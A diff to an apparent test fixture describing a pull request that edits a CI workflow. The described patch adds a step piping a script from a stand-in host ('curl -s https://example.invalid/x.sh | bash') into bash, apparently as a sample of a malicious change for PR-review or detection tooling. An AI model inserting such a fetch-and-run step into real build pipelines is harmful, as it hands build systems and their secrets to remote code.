@@ -14,9 +14,9 @@
   "files": [
     {
       "path": ".github/workflows/ci.yml",
-      "additions": 3,
+      "additions": 2,
       "deletions": 1,
-      "patch": "@@ -20,4 +20,6 @@\n-      - run: make test\n+      - run: curl -s https://example.invalid/x.sh | bash\n+      - run: make test\n"
+      "patch": "@@ -20,1 +20,2 @@\n-      - run: make test\n+      - run: curl -s https://example.invalid/x.sh | bash\n+      - run: make test\n"
     }
   ],
   "org_open_prs_24h": 1,
